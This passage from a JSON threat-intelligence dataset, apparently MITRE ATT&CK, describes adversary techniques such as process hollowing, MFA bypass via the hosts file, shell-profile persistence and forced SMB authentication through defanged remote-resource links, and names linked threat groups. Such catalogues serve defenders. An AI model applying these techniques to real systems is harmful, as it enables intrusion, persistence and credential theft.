Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.^[[2]](https://www.cisa.gov/uscert/ncas/alerts/aa22-074a)^\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.^[[3]](https://technet.microsoft.com/en-us/library/dn535501.aspx)^","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace","Containers","Network"],"tactics":["Defense Evasion","Persistence","Privilege Escalation","Initial Access"],"campaigns":["Night Dragon","Operation Wocao","2015 Ukraine Electric Power Attack","SolarWinds Compromise"],"groups":["APT41","FIN8","FIN4","FIN7","Dragonfly","GALLIUM","APT18","Lazarus Group","Chimera","menuPass","Sandworm Team","LAPSUS$","Carbanak","APT28","Threat Group-3390","Suckfly","Axiom","Leviathan","PittyTiger","Silence","OilRig","Wizard Spider","APT29","TEMP.Veles","Ke3chang","FIN10","APT33","FIN6","Fox Kitten","POLONIUM","FIN5","Silent Librarian","APT39","UNC2452","Night Dragon","Operation Wocao","Dragonfly 2.0","APT34"]},"T1571":{"id":"T1571","name":"Non-Standard Port","description":"Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088^[[1]](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)^ or port 587^[[2]](https://www.fortinet.com/blog/threat-research/analysis-of-new-agent-tesla-spyware-variant.html)^ as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.^[[3]](https://twitter.com/TheDFIRReport/status/1498657772254240768)^","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["Operation Wocao","C0018"],"groups":["WIRTE","Silence","APT32","Sandworm Team","TEMP.Veles","Lazarus Group","FIN7","Magic Hound","DarkVishnya","APT-C-36","APT33","Rocke"]},"T1585.001":{"id":"T1585.001","name":"Social Media Accounts","description":"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.^[[1]](https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation)^^[[2]](http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf)^\n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \n\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.^[[1]](https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation)^^[[2]](http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf)^ These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Dream Job","Operation Ghost"],"groups":["Sandworm Team","EXOTIC LILY","HEXANE","Kimsuky","Leviathan","CURIUM","Cleaver","Lazarus Group","APT32","Fox Kitten","Magic Hound"]},"T1055.012":{"id":"T1055.012","name":"Process Hollowing","description":"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as `CreateProcess`, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as `ZwUnmapViewOfSection` or `NtUnmapViewOfSection`  before being written to, realigned to the injected code, and resumed via `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, then `ResumeThread` respectively.^[[1]](http://www.autosectools.com/process-hollowing.pdf)^^[[2]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^\n\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":["Gorgon Group","Threat Group-3390","Patchwork","TA2541","menuPass","Kimsuky"]},"T1068":{"id":"T1068","name":"Exploitation for Privilege Escalation","description":"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).^[[1]](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf)^^[[2]](https://unit42.paloaltonetworks.com/acidbox-rare-malware/)^ Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).","platforms":["Linux","macOS","Windows","Containers"],"tactics":["Privilege Escalation"],"campaigns":["C0017"],"groups":["Threat Group-3390","APT29","Turla","PLATINUM","FIN8","Cobalt Group","MoustachedBouncer","FIN6","Whitefly","BITTER","LAPSUS$","Scattered Spider","APT28","ZIRCONIUM","Tonto Team","APT32","APT33"]},"T1564.009":{"id":"T1564.009","name":"Resource Forking","description":"Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.^[[1]](http://tenon.com/products/codebuilder/User_Guide/6_File_Systems.html#anchor520553)^ Usage of a resource fork is identifiable when displaying a file’s extended attributes, using `ls -l@` or `xattr -l` commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the `/Resources` folder.^[[2]](https://flylib.com/books/en/4.395.1.192/1/)^^[[3]](https://eclecticlight.co/2020/10/24/theres-more-to-files-than-data-extended-attributes/)^\n\nAdversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.^[[4]](https://www.sentinelone.com/labs/resourceful-macos-malware-hides-in-named-fork/)^^[[5]](https://blogs.vmware.com/security/2020/06/tau-threat-analysis-bundlore-macos-mm-install-macos.html)^","platforms":["macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1531":{"id":"T1531","name":"Account Access Removal","description":"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.^[[1]](https://www.carbonblack.com/2019/03/22/tau-threat-intelligence-notification-lockergoga-ransomware/)^^[[2]](https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/)^\n\nIn Windows, [Net](https://attack.mitre.org/software/S0039) utility, `Set-LocalUser` and `Set-ADAccountPassword` [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. In Linux, the `passwd` utility may be used to change passwords. Accounts could also be disabled by Group Policy. \n\nAdversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective. ","platforms":["Linux","macOS","Windows","Office 365","SaaS"],"tactics":["Impact"],"campaigns":[],"groups":["LAPSUS$"]},"T1110.004":{"id":"T1110.004","name":"Credential Stuffing","description":"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.^[[1]](https://www.us-cert.gov/ncas/alerts/TA18-086A)^","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace","Containers"],"tactics":["Credential Access"],"campaigns":[],"groups":["Chimera"]},"T1027":{"id":"T1027","name":"Obfuscated Files or Information","description":"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. ^[[1]](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/)^ Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. ^[[2]](https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/)^ Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. ^[[3]](https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/)^\n\nAdversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. ^[[4]](https://web.archive.org/web/20170923102302/https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html)^ ^[[5]](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf)^^[[6]](https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/)^ ","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":["Night Dragon","Operation Honeybee","C0017","2016 Ukraine Electric Power Attack","Operation Dust Storm","C0015","Operation Dream Job","Operation Spalax"],"groups":["Inception","BackdoorDiplomacy","Dark Caracal","Elderwood","Darkhotel","Transparent Tribe","APT28","APT18","Rocke","GALLIUM","Leviathan","Gallmaker","Sidewinder","Molerats","APT39","Lazarus Group","APT33","BlackOasis","BITTER","TA505","Higaisa","APT3","APT19","Fox Kitten","Ember Bear","Threat Group-3390","TA2541","APT-C-36","Magic Hound","Blue Mockingbird","Tropic Trooper","Mofang","Whitefly","Windshift","menuPass","Ke3chang","APT37","Kimsuky","Moses Staff","TeamTNT","Metador","Mustang Panda","Sandworm Team","Group5","Earth Lusca","Putter Panda","OilRig","APT32","Gamaredon Group","APT41","APT29","UNC2452","Operation Wocao","Frankenstein","Night Dragon","Dust Storm","Honeybee","Machete","APT34"]},"T1556.006":{"id":"T1556.006","name":"Multi-Factor Authentication","description":"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.^[[1]](https://www.mandiant.com/media/17826)^^[[2]](https://docs.microsoft.com/en-us/azure/active-directory/governance/conditional-access-exclusion)^\n\nFor example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. ^[[3]](https://www.cisa.gov/uscert/ncas/alerts/aa22-074a)^ \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.^[[3]](https://www.cisa.gov/uscert/ncas/alerts/aa22-074a)^ ","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Google Workspace","Linux","macOS"],"tactics":["Credential Access","Defense Evasion","Persistence"],"campaigns":[],"groups":[]},"T1114.002":{"id":"T1114.002","name":"Remote Email Collection","description":"Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.","platforms":["Office 365","Windows","Google Workspace"],"tactics":["Collection"],"campaigns":["SolarWinds Compromise"],"groups":["Ke3chang","APT28","APT1","APT29","HAFNIUM","Magic Hound","Chimera","Dragonfly","FIN4","Leafminer","Kimsuky","UNC2452","Dragonfly 2.0"]},"T1505.004":{"id":"T1505.004","name":"IIS Components","description":"Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: `Get{Extension/Filter}Version`, `Http{Extension/Filter}Proc`, and (optionally) `Terminate{Extension/Filter}`. IIS modules may also be installed to extend IIS web servers.^[[1]](https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525172(v=vs.90))^^[[2]](https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524610(v=vs.90))^^[[3]](https://web.archive.org/web/20170106175935/http:/esec-lab.sogeti.com/posts/2011/02/02/iis-backdoor.html)^^[[4]](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/)^\n\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.^[[2]](https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524610(v=vs.90))^^[[1]](https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525172(v=vs.90))^^[[5]](https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525696(v=vs.90))^^[[6]](https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage)^^[[4]](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/)^^[[7]](https://web.archive.org/web/20140804175025/http:/blogs.technet.com/b/mmpc/archive/2012/10/03/malware-signed-with-the-adobe-code-signing-certificate.aspx)^\n\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports `RegisterModule`, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.^[[8]](https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview)^^[[4]](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/)^^[[9]](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Anatomy-Of-Native-Iis-Malware-wp.pdf)^","platforms":["Windows"],"tactics":["Persistence"],"campaigns":["Operation Dream Job"],"groups":[]},"T1036.001":{"id":"T1036.001","name":"Invalid Code Signature","description":"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.^[[1]](https://threatexpress.com/blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/)^\n\nUnlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.","platforms":["macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["APT37","Windshift"]},"T1564.006":{"id":"T1564.006","name":"Run Virtual Instance","description":"Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.^[[1]](https://www.mci.gov.sg/-/media/mcicorp/doc/report-of-the-coi-into-the-cyber-attack-on-singhealth-10-jan-2019.ashx)^\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.^[[2]](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1201":{"id":"T1201","name":"Password Policy Discovery","description":"Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as `net accounts (/domain)`, `Get-ADDefaultDomainPasswordPolicy`, `chage -l <username>`, `cat /etc/pam.d/common-password`, and `pwpolicy getaccountpolicies` ^[[1]](https://superuser.com/questions/150675/how-to-display-password-policy-information-for-a-user-ubuntu)^ ^[[2]](https://www.jamf.com/jamf-nation/discussions/18574/user-password-policies-on-non-ad-machines)^. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. `show aaa`, `show aaa common-criteria policy all`).^[[3]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^\n\nPassword policies can be discovered in cloud environments using available APIs such as `GetAccountPasswordPolicy` in AWS ^[[4]](https://docs.aws.amazon.com/IAM/latest/APIReference/API_GetAccountPasswordPolicy.html)^.","platforms":["Windows","Linux","macOS","IaaS","Network"],"tactics":["Discovery"],"campaigns":["Operation CuckooBees"],"groups":["OilRig","Chimera","Turla","APT34"]},"T1546":{"id":"T1546","name":"Event Triggered Execution","description":"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.^[[1]](https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9)^^[[2]](https://www.varonis.com/blog/power-automate-data-exfiltration)^^[[3]](https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team)^\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.^[[4]](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)^^[[5]](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf)^^[[6]](https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/)^\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ","platforms":["Linux","macOS","Windows","SaaS","IaaS","Office 365"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":[]},"T1546.004":{"id":"T1546.004","name":"Unix Shell Configuration Modification","description":"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (`/etc`) and the user’s home directory (`~/`) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the `/etc/profile` and `/etc/profile.d` files.^[[1]](https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/)^^[[2]](https://bencane.com/2013/09/16/understanding-a-little-more-about-etcprofile-and-etcbashrc/)^ These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into `~/.bash_profile`, `~/.bash_login`, or `~/.profile` which are sourced when a user opens a command-line interface or connects remotely.^[[3]](https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect)^^[[4]](https://wiki.archlinux.org/index.php/Bash#Invocation)^ Since the system only executes the first existing file in the listed order, adversaries have used `~/.bash_profile` to ensure execution. Adversaries have also leveraged the `~/.bashrc` file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.^[[5]](https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/)^^[[3]](https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect)^^[[6]](https://www.anomali.com/blog/pulling-linux-rabbit-rabbot-malware-out-of-a-hat)^^[[7]](https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html)^ Some malware targets the termination of a program to trigger execution, adversaries can use the `~/.bash_logout` file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using `/etc/profile`, `/etc/zshenv`, `/etc/zprofile`, and `/etc/zlogin`.^[[8]](https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/)^^[[9]](https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5)^^[[10]](https://github.com/D00MFist/PersistentJXA/blob/master/BashProfilePersist.js)^^[[11]](https://cedowens.medium.com/macos-ms-office-sandbox-brain-dump-4509b5fed49a)^ The login shell then configures the user environment with `~/.zprofile` and `~/.zlogin`. The interactive shell uses the `~/.zshrc` to configure the user environment. Upon exiting, `/etc/zlogout` and `~/.zlogout` are executed. For legacy programs, macOS executes `/etc/bashrc` on startup.","platforms":["Linux","macOS"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":[]},"T1187":{"id":"T1187","name":"Forced Authentication","description":"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\n\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. ^[[1]](https://en.wikipedia.org/wiki/Server_Message_Block)^ This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\n\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. ^[[2]](https://blog.didierstevens.com/2017/11/13/webdav-traffic-to-malicious-sites/)^ ^[[3]](https://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/4beddb35-0cba-424c-8b9b-a5832ad8e208.mspx)^\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. ^[[4]](https://github.com/hob0/hashjacking)^ With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. ^[[5]](https://www.cylance.com/content/dam/cylance/pdfs/white_papers/RedirectToSMB.pdf)^\n\nThere are several different ways this can occur. ^[[6]](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)^ Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to `file[:]//[remote address]/Normal.dotm` to trigger the SMB request. ^[[7]](https://www.us-cert.gov/ncas/alerts/TA17-293A)^\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as `\\\\[remote address]\\pic.png` that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. ^[[7]](https://www.us-cert.gov/ncas/alerts/TA17-293A)^","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":[],"groups":["DarkHydrus","Dragonfly","Dragonfly 2.0"]},"T1134.005":{"id":"T1134.005","name":"SID-History Injection","description":"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. ^[[1]](https://msdn.microsoft.com/library/windows/desktop/aa379571.aspx)^ An account can hold additional SIDs in the SID-History Active Directory attribute ^[[2]](https://msdn.microsoft.com/library/ms679833.aspx)^, allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values ^[[3]](https://support.microsoft.com/help/243330/well-known-security-identifiers-in-windows-operating-systems)^ may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":[]},"T1599":{"id":"T1599","name":"Network Boundary Bridging","description":"Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). 